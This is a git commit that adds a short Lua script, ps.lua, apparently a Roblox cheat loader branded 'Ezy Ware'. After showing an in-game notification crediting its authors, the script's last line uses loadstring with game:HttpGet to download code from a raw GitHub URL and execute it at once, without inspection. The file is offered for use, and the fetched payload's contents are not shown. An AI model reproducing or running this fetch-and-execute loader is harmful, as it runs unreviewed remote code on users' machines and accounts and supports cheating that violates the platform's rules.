151a151d62b14fe342ed29f97c2a97e846282954
EzydoesGithub <81513373+EzydoesGithub@users.noreply.github.com>
2022-07-19 14:02:57 -0400

    Create ps.lua

---
+++ ps.lua
@@ -0,0 +1,7 @@
+game.StarterGui:SetCore("SendNotification", {
+Title = "Ezy Ware";
+Text = "Provided by: Ezy \n Developer: 1fo";
+Duration = 5;
+})
+wait(2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/master/new"))()
